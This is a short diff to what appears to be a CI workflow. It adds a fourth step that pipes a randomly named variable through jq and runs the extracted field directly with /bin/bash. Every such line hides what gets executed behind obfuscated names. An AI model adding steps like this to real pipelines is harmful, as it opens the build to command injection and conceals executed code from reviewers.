@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$gwpno90" | jq -r .slaos1309 | /bin/bash
           printf '%s' "$o491" | jq -r .iqlbh9099 | /bin/bash
           printf '%s' "$gq55" | jq -r .fdls5 | /bin/bash
+          echo $bh33946 | jq -r .ctq149 | /bin/bash
 
       - name: Store artifact
         if: always()
